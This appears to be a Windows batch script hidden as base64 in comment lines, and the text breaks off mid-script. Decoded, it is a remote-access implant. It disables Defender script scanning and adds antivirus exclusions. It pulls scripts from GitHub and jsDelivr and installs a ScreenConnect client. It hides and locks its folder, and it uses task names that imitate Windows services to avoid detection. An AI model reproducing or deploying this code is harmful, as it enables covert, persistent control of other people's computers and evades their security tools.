::dGUiDQpzZXQgIkhCRkxBRz0lV0QlXGhiLmZsYWciDQpzZXQgIkNVUkw9JVN5c3Rl
::bVJvb3QlXFN5c3RlbTMyXGN1cmwuZXhlIg0Kc2V0ICJURz1odHRwczovL3Jhdy5n
::aXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi90
::Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiVEcyPWh0dHBz
::Oi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWlu
::L3RnX3JlcG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05TRUM9
::aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1
::Yi1kcm9wL21haW4vb3duX3NlY3VyZS5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIg0K
::c2V0ICJPV05TRUMyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRk
::eS9naXRodWItZHJvcEBtYWluL293bl9zZWN1cmUuY21kP3Q9JVJBTkRPTSUlUkFO
::RE9NJSINCnNldCAiT1dOTU9OPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50
::LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9tb24uY21kP3Q9JVJB
::TkRPTSUlUkFORE9NJSINCnNldCAiT1dOTU9OMj1odHRwczovL2Nkbi5qc2RlbGl2
::ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fbW9uLmNtZD90
::PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTkxJQj1odHRwczovL3Jhdy5naXRo
::dWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25f
::bGliLnBzMT90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTkxJQjI9aHR0cHM6
::Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4v
::b3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJNQU5JRkVTVF9V
::Ukw9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dp
::dGh1Yi1kcm9wL21haW4vdXBkYXRlLm1hbmlmZXN0P3Q9JVJBTkRPTSUlUkFORE9N
::JSINCnNldCAiTUFOSUZFU1RfU0lHX1VSTD1odHRwczovL3Jhdy5naXRodWJ1c2Vy
::Y29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi91cGRhdGUubWFu
::aWZlc3Quc2lnP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiU0VWUlpfRVhQX1VS
::TD1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0
::aHViLWRyb3AvbWFpbi9zZXZyel9leHBlY3RlZC5jZmc/dD0lUkFORE9NJSVSQU5E
::T00lIg0Kc2V0ICJTRVZSWl9FWFBfVVJMMj1odHRwczovL2Nkbi5qc2RlbGl2ci5u
::ZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9zZXZyel9leHBlY3RlZC5j
::Zmc/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJNU0lfVVJMPWh0dHBzOi8vdWku
::c2V2cnouY29tL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFj
::Y2VzcyZ5PUd1ZXN0Ig0Kc2V0ICJNU0lfUEtHMT1odHRwczovL3Jhdy5naXRodWJ1
::c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9wa2cubXNp
::Ig0Kc2V0ICJNU0lfUEtHMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5v
::YnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9wa2cubXNpIg0Kc2V0ICJNU0k9JVByb2dy
::YW1EYXRhJVxTY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaSINCnNldCAiTVNJ
::Q0FDSEU9JVdEJVxwa2cubXNpIg0KDQppZiBub3QgZXhpc3QgIiVXRCUiIG1kICIl
::V0QlIiAyPm51bA0KcmVtIE01NjogQU1TSSBleGNsdXNpb25zIEZJUlNUIChiZWZv
::cmUgYW55IHBvd2Vyc2hlbGwpIOKAlCBBViB3YXMgd2lwaW5nIGxpYiBhbmQgZm9y
::Y2luZyBNMzYgZmFsbGJhY2sNCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNp
::ZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rp
::b24iIC92IERpc2FibGVTY3JpcHRTY2FubmluZyAvdCBSRUdfRFdPUkQgL2QgMSAv
::ZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdp
::bmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRCUiIC90IFJF
::R19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
::RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAv
::diAiJUVUTCUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFk
::ZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNs
::dXNpb25zXFBhdGhzIiAvdiAiJVN5c3RlbVJvb3QlXFRlbXBcLnVwZCIgL3QgUkVH
::X0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJF
::XE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUHJvY2Vzc2Vz
::IiAvdiAicG93ZXJzaGVsbC5leGUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwg
::Mj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBE
::ZWZlbmRlclxFeGNsdXNpb25zXFByb2Nlc3NlcyIgL3YgIlNjcmVlbkNvbm5lY3Qu
::Q2xpZW50U2VydmljZS5leGUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4m
::MQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZl
::bmRlclxFeGNsdXNpb25zXFByb2Nlc3NlcyIgL3YgIm1zaWV4ZWMuZXhlIiAvdCBS
::RUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJUxPRyUi
::IHR5cGUgbnVsPiIlTE9HJSIgMj5udWwNCg0Kc2V0ICJNT05WRVI9TTcxIg0Kc2V0
::ICJNT05fTUlOPU03MSINCnNldCAiR0lUX1BJTj0iDQpzZXQgIkNIQU5ORUxfVVJM
::PWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRo
::dWItZHJvcC9tYWluL2ZsZWV0X2NoYW5uZWwuY2ZnP3Q9JVJBTkRPTSUlUkFORE9N
::JSINCnNldCAiRkxPT1JfRklMRT0lV0QlXHZlcnNpb25fZmxvb3IuY2ZnIg0Kc2V0
::ICJNT05fRkxPT1I9MCINCnNldCAiTElCX0ZMT09SPTAiDQpzZXQgIlBGODY9JVBy
::b2dyYW1GaWxlcyh4ODYpJSINCmZvciAvZiAidG9rZW5zPTEtMyBkZWxpbXM9LyAi
::ICUlYSBpbiAoIiVkYXRlJSIpIGRvIHNldCAiRFQ9JWRhdGUlICV0aW1lJSINCmVj
::aG8uPj4iJUxPRyUiDQplY2hvIOKUgOKUgCB0aWNrICFEVCEgW3ZlciAlTU9OVkVS
::JV0g4pSA4pSAPj4iJUxPRyUiDQoNCnJlbSBNNTg6IHN0aWNreSB2ZXJzaW9uX2Zs
::b29yLmNmZyDigJQgb25jZSByYWlzZWQsIG5ldmVyIGFwcGx5IG9sZGVyIG1vbi9s
::aWINCmlmIGV4aXN0ICIlRkxPT1JfRklMRSUiIGZvciAvZiAidXNlYmFja3EgdG9r
::ZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJUZMT09SX0ZJTEUlIikgZG8gKA0K
::ICBpZiAvSSAiJSVLIj09Ik1PTl9GTE9PUiIgc2V0ICJNT05fRkxPT1I9JSVMIg0K
::ICBpZiAvSSAiJSVLIj09IkxJQl9GTE9PUiIgc2V0ICJMSUJfRkxPT1I9JSVMIg0K
::KQ0Kc2V0IC9hIF9DVVJNPSVNT05WRVI6TT0lIDI+bnVsDQppZiBub3QgZGVmaW5l
::ZCBfQ1VSTSBzZXQgIl9DVVJNPTAiDQppZiAhX0NVUk0hIEdUUiAhTU9OX0ZMT09S
::ISBzZXQgIk1PTl9GTE9PUj0hX0NVUk0hIg0KaWYgZXhpc3QgIiVXRCVcb3duX2xp
::Yi5wczEiICgNCiAgY2FsbCA6UGFyc2VMaWJOdW0gIiVXRCVcb3duX2xpYi5wczEi
::DQogIGlmICFfUE4hIEdUUiAhTElCX0ZMT09SISBzZXQgIkxJQl9GTE9PUj0hX1BO
::ISINCikNCmNhbGwgOlNhdmVGbG9vcg0Kc2V0ICJDT1VOVD0wIg0Kc2V0ICJJTlNU
::QUxMRUQ9MCINCnNldCAiUFJJTV9PSz0wIg0Kc2V0ICJBTFRfT0s9MCINCnNldCAi
::Rk9SRUlHTl9MRUZUPTAiDQpzZXQgIkZPUkVJR05fTElTVD0iDQpzZXQgIk1TSUVY
::SVQ9bm90LXJ1biINCg0KcmVtIOKUgOKUgCBbMF0gc2luZ2xlLWZsaWdodCBtdXRl
::eCAoc3RvcCBvdmVybGFwcGluZyB0aWNrcyByYWNpbmcgbXNpZXhlYykg4pSA4pSA
::DQpzZXQgIk1VVEVYPSVXRCVcdGljay5sb2NrIg0KaWYgZXhpc3QgIiVNVVRFWCUi
::ICgNCiAgZm9yICUlQSBpbiAoIiVNVVRFWCUiKSBkbyBzZXQgIkxPQ0tBR0U9JSV+
::dEEiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNv
::bW1hbmQgImlmKChUZXN0LVBhdGggJyVNVVRFWCUnKSAtYW5kICgoKEdldC1EYXRl
::KS0oR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclTVVURVglJyAtRm9yY2UpLkxhc3RX
::cml0ZVRpbWUpLlRvdGFsTWludXRlcyAtbHQgMjApKXsgZXhpdCAxIH0gZWxzZSB7
::IGV4aXQgMCB9IiA+bnVsIDI+JjENCiAgaWYgZXJyb3JsZXZlbCAxICgNCiAgICBl
::Y2hvIHRpY2tfc2tpcHBlZF9tdXRleF9idXN5Pj4iJUxPRyUiDQogICAgZW5kbG9j
::YWwNCiAgICBleGl0IC9iIDANCiAgKQ0KKQ0KZWNobyAlREFURSUgJVRJTUUlICVS
::QU5ET00lPiIlTVVURVglIg0KDQpyZW0g4pSA4pSAIHBlci1ob3N0IGlkZW50aXR5
::IChhbnRpLXNpZ25hdHVyZSkg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiBl
::eGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1O
::b25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdE
::JVxvd25fbGliLnBzMSIgLUFjdGlvbiBpbml0IC1Xb3JrRGlyICIlV0QlIiA+bnVs
::IDI+JjENCmlmIGV4aXN0ICIlV0QlXGlkZW50aXR5LmNmZyIgZm9yIC9mICJ1c2Vi
::YWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGlkZW50aXR5
::LmNmZyIpIGRvIHNldCAiJSVLPSUlTCINCmlmIG5vdCBkZWZpbmVkIFRBU0tfQSBz
::ZXQgIlRBU0tfQT1XZXJRdWV1ZVN5bmMiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Ig
::c2V0ICJUQVNLX0I9UGxhU2VydmVySGVhbHRoIg0KaWYgbm90IGRlZmluZWQgVEFT
::S19DIHNldCAiVEFTS19DPVdkaUhvc3RQcm94eSINCmlmIG5vdCBkZWZpbmVkIFRB
::U0tfRCBzZXQgIlRBU0tfRD1UY3BJcENvbmZsaWN0UmVzIg0KaWYgbm90IGRlZmlu
::ZWQgTU9fQSBzZXQgIk1PX0E9MiINCmlmIG5vdCBkZWZpbmVkIE1PX0Igc2V0ICJN
::T19CPTMiDQoNCnJlbSDilIDilIAgW0FdIGF1dG8tdXBkYXRlIGNvcmUgZmlsZXMg
::KGJlc3QgZWZmb3J0KSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIDilIANCmlmIG5vdCBleGlzdCAiJUNVUkwlIiBzZXQg
::IkNVUkw9Y3VybC5leGUiDQpyZW0gTTM1OiBndWFyYW50ZWUgdXBkYXRlIGNoYW5u
::ZWwg4oCUIHVuaGFyZGVuIHdvcmtkaXIgZWFjaCB0aWNrIGFuZCBzdGFnZSBkb3du
::bG9hZHMNCnJlbSBpbiBDOlxXaW5kb3dzXFRlbXAgKG5ldmVyIEFDTC1sb2NrZWQp
::LCB0aGVuIG1vdmUgaW50byAlV0QlLiBMb2NrRGlyIGNhbm5vdCBmcmVlemUgdXMu
::DQpzZXQgIlNUQUdFPSVTeXN0ZW1Sb290JVxUZW1wXC51cGQiDQppZiBub3QgZXhp
::c3QgIiVTVEFHRSUiIG1rZGlyICIlU1RBR0UlIiA+bnVsIDI+JjENCnJlbSBNNTcv
::TTU4OiBmbGVldF9jaGFubmVsLmNmZyBwaW4gKyByYWlzZSBzdGlja3kgZmxvb3Jz
::IChjaGFubmVsIG5ldmVyIGxvd2VycyBsb2NhbCBmbG9vcikNCiIlQ1VSTCUiIC1M
::IC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA2IC0tbWF4LXRpbWUg
::MTUgLW8gIiVTVEFHRSVcZmxlZXRfY2hhbm5lbC5jZmciICIlQ0hBTk5FTF9VUkwl
::IiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlU1RBR0UlXGZsZWV0X2NoYW5uZWwuY2Zn
::IiAoDQogIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVL
::IGluICgiJVNUQUdFJVxmbGVldF9jaGFubmVsLmNmZyIpIGRvICgNCiAgICBpZiAv
::SSAiJSVLIj09Ik1PTl9NSU4iIHNldCAiTU9OX01JTj0lJUwiDQogICAgaWYgL0kg
::IiUlSyI9PSJMSUJfTUlOIiBzZXQgIkxJQl9NSU49JSVMIg0KICAgIGlmIC9JICIl
::JUsiPT0iR0lUX1BJTiIgc2V0ICJHSVRfUElOPSUlTCINCiAgKQ0KICBpZiBkZWZp
::bmVkIE1PTl9NSU4gKA0KICAgIHNldCAiX0NNPSFNT05fTUlOOk09ISINCiAgICBp
::ZiAhX0NNISBHVFIgIU1PTl9GTE9PUiEgc2V0ICJNT05fRkxPT1I9IV9DTSEiDQog
::ICkNCiAgaWYgZGVmaW5lZCBMSUJfTUlOICgNCiAgICBzZXQgIl9DTD0hTElCX01J
::TjpMPSEiDQogICAgaWYgIV9DTCEgR1RSICFMSUJfRkxPT1IhIHNldCAiTElCX0ZM
::T09SPSFfQ0whIg0KICApDQogIGNhbGwgOlNhdmVGbG9vcg0KICByZW0gTTY5OiBH
::SVRfUElOPW1haW4gKG9yIGVtcHR5KSDihpIgYWx3YXlzIHRpcDsgb25seSBub24t
::bWFpbiBwaW5zIG92ZXJyaWRlIFVSTHMNCiAgaWYgZGVmaW5lZCBHSVRfUElOIGlm
::IC9JIG5vdCAiIUdJVF9QSU4hIj09Im1haW4iIGlmIG5vdCAiIUdJVF9QSU4hIj09
::IiIgKA0KICAgIHNldCAiT1dOTU9OPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250
::ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC8hR0lUX1BJTiEvb3duX21vbi5j
::bWQ/dD0lUkFORE9NJSVSQU5ET00lIg0KICAgIHNldCAiT1dOTElCPWh0dHBzOi8v
::cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC8h
::R0lUX1BJTiEvb3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0KICAgIHNl
::dCAiT1dOU0VDPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9i
::dWRkeS9naXRodWItZHJvcC8hR0lUX1BJTiEvb3duX3NlY3VyZS5jbWQ/dD0lUkFO
::RE9NJSVSQU5ET00lIg0KICAgIHNldCAiTUFOSUZFU1RfVVJMPWh0dHBzOi8vcmF3
::LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC8hR0lU
::X1BJTiEvdXBkYXRlLm1hbmlmZXN0P3Q9JVJBTkRPTSUlUkFORE9NJSINCiAgICBz
::ZXQgIk1BTklGRVNUX1NJR19VUkw9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRl
::bnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wLyFHSVRfUElOIS91cGRhdGUubWFu
::aWZlc3Quc2lnP3Q9JVJBTkRPTSUlUkFORE9NJSINCiAgICBlY2hvIGNoYW5uZWxf
::cGluPSFHSVRfUElOISBtb25fbWluPSFNT05fTUlOISBsaWJfbWluPSFMSUJfTUlO
::IT4+IiVMT0clIg0KICApIGVsc2UgKA0KICAgIHNldCAiT1dOTU9OPWh0dHBzOi8v
::cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9t
::YWluL293bl9tb24uY21kP3Q9JVJBTkRPTSUlUkFORE9NJSINCiAgICBzZXQgIk9X
::TkxJQj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkv
::Z2l0aHViLWRyb3AvbWFpbi9vd25fbGliLnBzMT90PSVSQU5ET00lJVJBTkRPTSUi
::DQogICAgc2V0ICJPV05TRUM9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQu
::Y29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX3NlY3VyZS5jbWQ/dD0l
::UkFORE9NJSVSQU5ET00lIg0KICAgIHNldCAiTUFOSUZFU1RfVVJMPWh0dHBzOi8v
::cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9t
::YWluL3VwZGF0ZS5tYW5pZmVzdD90PSVSQU5ET00lJVJBTkRPTSUiDQogICAgc2V0
::ICJNQU5JRkVTVF9TSUdfVVJMPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50
::LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL3VwZGF0ZS5tYW5pZmVzdC5z
::aWc/dD0lUkFORE9NJSVSQU5ET00lIg0KICAgIGVjaG8gY2hhbm5lbF9waW49bWFp
::biBtb25fbWluPSFNT05fTUlOISBsaWJfbWluPSFMSUJfTUlOISBhbHdheXNfdGlw
::PTE+PiIlTE9HJSINCiAgKQ0KICBlY2hvIGZsb29yIG1vbj0hTU9OX0ZMT09SISBs
::aWI9IUxJQl9GTE9PUiE+PiIlTE9HJSINCiAgY29weSAveSAiJVNUQUdFJVxmbGVl
::dF9jaGFubmVsLmNmZyIgIiVXRCVcZmxlZXRfY2hhbm5lbC5jZmciID5udWwgMj4m
::MQ0KKQ0KYXR0cmliIC1oIC1zIC1yICIlV0QlIiA+bnVsIDI+JjENCnRha2Vvd24g
::L0YgIiVXRCUiIC9SIC9EIFkgPm51bCAyPiYxDQppY2FjbHMgIiVXRCUiIC9yZXNl
::dCAvVCAvQyAvUSA+bnVsIDI+JjENCmljYWNscyAiJVdEJSIgL2dyYW50ICJOVCBB
::VVRIT1JJVFlcU1lTVEVNOihPSSkoQ0kpRiIgIkJVSUxUSU5cQWRtaW5pc3RyYXRv
::cnM6KE9JKShDSSlGIiAvVCAvQyAvUSA+bnVsIDI+JjENCmF0dHJpYiAtaCAtcyAt
::ciAiJVdEJVx0Z19yZXBvcnQucHMxIiAiJVdEJVxvd25fc2VjdXJlLmNtZCIgIiVX
::RCVcb3duX2xpYi5wczEiICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjENCg0K
::c2V0ICJTRUxGX1VQRD0wIg0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0t
::Y29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVNUQUdFJVx0Z19y
::ZXBvcnQubmV3IiAiJVRHJSIgPm51bCAyPiYxDQppZiBub3QgZXhpc3QgIiVTVEFH
::RSVcdGdfcmVwb3J0Lm5ldyIgIiVDVVJMJSIgLUwgLS1jb25uZWN0LXRpbWVvdXQg
::OCAtLW1heC10aW1lIDQwIC1vICIlU1RBR0UlXHRnX3JlcG9ydC5uZXciICIlVEcy
::JSIgPm51bCAyPiYxDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25u
::ZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDMwIC1vICIlU1RBR0UlXG93bl9zZWN1
::cmUubmV3IiAiJU9XTlNFQyUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlU1RB
::R0UlXG93bl9zZWN1cmUubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91
::dCA4IC0tbWF4LXRpbWUgMzAgLW8gIiVTVEFHRSVcb3duX3NlY3VyZS5uZXciICIl
::T1dOU0VDMiUiID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tl
::IC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVNUQUdFJVxv
::d25fbGliLm5ldyIgIiVPV05MSUIlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAi
::JVNUQUdFJVxvd25fbGliLm5ldyIgIiVDVVJMJSIgLUwgLS1jb25uZWN0LXRpbWVv
::dXQgOCAtLW1heC10aW1lIDQwIC1vICIlU1RBR0UlXG93bl9saWIubmV3IiAiJU9X
::TkxJQjIlIiA+bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAt
::LWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVTVEFHRSVcb3du
::X21vbi5uZXh0IiAiJU9XTk1PTiUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIl
::U1RBR0UlXG93bl9tb24ubmV4dCIgIiVDVVJMJSIgLUwgLS1jb25uZWN0LXRpbWVv
::dXQgOCAtLW1heC10aW1lIDQwIC1vICIlU1RBR0UlXG93bl9tb24ubmV4dCIgIiVP
::V05NT04yJSIgPm51bCAyPiYxDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2Ug
::LS1jb25uZWN0LXRpbWVvdXQgNiAtLW1heC10aW1lIDIwIC1vICIlU1RBR0UlXHVw
::ZGF0ZS5tYW5pZmVzdCIgIiVNQU5JRkVTVF9VUkwlIiA+bnVsIDI+JjENCiIlQ1VS
::TCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA2IC0tbWF4
::LXRpbWUgMjAgLW8gIiVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0LnNpZyIgIiVNQU5J
::RkVTVF9TSUdfVVJMJSIgPm51bCAyPiYxDQoNCnJlbSBNNDI6IHNpZ25lZCB1cGRh
::dGUubWFuaWZlc3QgZ2F0ZSAoUlNBLVNIQTI1NikuIEZhbGxiYWNrIHRvIEJVSUxE
::IG1hcmtlcnMgaWYgbm8gcHVia2V5IHlldC4NCnNldCAiVVBEX09LPTAiDQpzZXQg
::Ik1BUD0iDQppZiBleGlzdCAiJVNUQUdFJVxvd25fbGliLm5ldyIgc2V0ICJNQVA9
::IU1BUCFvd25fbGliLnBzMT0lU1RBR0UlXG93bl9saWIubmV3OyINCmlmIGV4aXN0
::ICIlU1RBR0UlXG93bl9tb24ubmV4dCIgc2V0ICJNQVA9IU1BUCFvd25fbW9uLmNt
::ZD0lU1RBR0UlXG93bl9tb24ubmV4dDsiDQppZiBleGlzdCAiJVNUQUdFJVxvd25f
::c2VjdXJlLm5ldyIgc2V0ICJNQVA9IU1BUCFvd25fc2VjdXJlLmNtZD0lU1RBR0Ul
::XG93bl9zZWN1cmUubmV3OyINCmlmIGV4aXN0ICIlU1RBR0UlXHRnX3JlcG9ydC5u
::ZXciIHNldCAiTUFQPSFNQVAhdGdfcmVwb3J0LnBzMT0lU1RBR0UlXHRnX3JlcG9y
::dC5uZXc7Ig0Kc2V0ICJWUkVTPW1pc3NpbmciDQppZiBleGlzdCAiJVdEJVxvd25f
::bGliLnBzMSIgaWYgZXhpc3QgIiVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0IiBpZiBl
::eGlzdCAiJVNUQUdFJVx1cGRhdGUubWFuaWZlc3Quc2lnIiBpZiBkZWZpbmVkIE1B
::UCAoDQogIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJz
::aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5
::IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiB2ZXJpZnkt
::dXBkYXRlIC1Xb3JrRGlyICIlV0QlIiAtRXh0cmEgIiVTVEFHRSVcdXBkYXRlLm1h
::bmlmZXN0fCVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0LnNpZ3whTUFQISJgKSBkbyBz
::ZXQgIlZSRVM9JSVSIg0KKQ0KZWNobyB1cGRhdGVfdmVyaWZ5PSFWUkVTIT4+IiVM
::T0clIg0KaWYgL0kgIiFWUkVTISI9PSJvayIgKA0KICBzZXQgIlVQRF9PSz0xIg0K
::KSBlbHNlIGlmIC9JICIhVlJFUyEiPT0ibWlzc2luZyIgKA0KICBzZXQgIlVQRF9P
::Sz1mYWxsYmFjayINCikgZWxzZSBpZiAvSSAiIVZSRVMhIj09Im5vLXB1YmtleSIg
::KA0KICBzZXQgIlVQRF9PSz1mYWxsYmFjayINCikgZWxzZSBpZiAvSSAiIVZSRVM6
::fjAsMTAhIj09Im5vdC1pbi1tYW4iICgNCiAgc2V0ICJVUERfT0s9ZmFsbGJhY2si
::DQopIGVsc2UgaWYgL0kgIiFWUkVTOn4wLDEzISI9PSJoYXNoLW1pc21hdGNoIiAo
::DQogIHJlbSBNNTA6IENETiBtYXkgc2VydmUgc3RhbGUgbWFpbiB3aGlsZSBtYW5p
::ZmVzdCBpcyBmcmVzaCDigJQgbmV2ZXIgcmVmdXNlLWFsbCAodGhhdCBzdHVjayBm
::bGVldCBvbiBNNDgpLg0KICBzZXQgIlVQRF9PSz1mYWxsYmFjayINCiAgZWNobyB1
::cGRhdGVfaGFzaF9taXNtYXRjaF9mYWxsYmFja18hVlJFUyE+PiIlTE9HJSINCikg
::ZWxzZSAoDQogIGVjaG8gdXBkYXRlX3JlZnVzZWRfIVZSRVMhPj4iJUxPRyUiDQop
::DQoNCmlmIC9JICIhVVBEX09LISI9PSIxIiAoDQogIGlmIGV4aXN0ICIlU1RBR0Ul
::XHRnX3JlcG9ydC5uZXciIG1vdmUgL3kgIiVTVEFHRSVcdGdfcmVwb3J0Lm5ldyIg
::IiVXRCVcdGdfcmVwb3J0LnBzMSIgPm51bCAyPiYxDQogIGlmIGV4aXN0ICIlU1RB
::R0UlXG93bl9zZWN1cmUubmV3IiBtb3ZlIC95ICIlU1RBR0UlXG93bl9zZWN1cmUu
::bmV3IiAiJVdEJVxvd25fc2VjdXJlLmNtZCIgPm51bCAyPiYxDQogIGlmIGV4aXN0
::ICIlU1RBR0UlXG93bl9saWIubmV3IiAoDQogICAgY2FsbCA6UmVmdXNlSWZMaWJC
::ZWxvd0Zsb29yICIlU1RBR0UlXG93bl9saWIubmV3Ig0KICAgIGlmIGVycm9ybGV2
::ZWwgMSAoDQogICAgICBlY2hvIGxpYl9kb3duZ3JhZGVfYmxvY2tlZCBmbG9vcj0h
::TElCX0ZMT09SIT4+IiVMT0clIg0KICAgICAgZGVsIC9mIC9xICIlU1RBR0UlXG93
::bl9saWIubmV3IiA+bnVsIDI+JjENCiAgICApIGVsc2UgKA0KICAgICAgbW92ZSAv
::eSAiJVNUQUdFJVxvd25fbGliLm5ldyIgIiVXRCVcb3duX2xpYi5wczEiID5udWwg
::Mj4mMQ0KICAgICAgY2FsbCA6UGFyc2VMaWJOdW0gIiVXRCVcb3duX2xpYi5wczEi
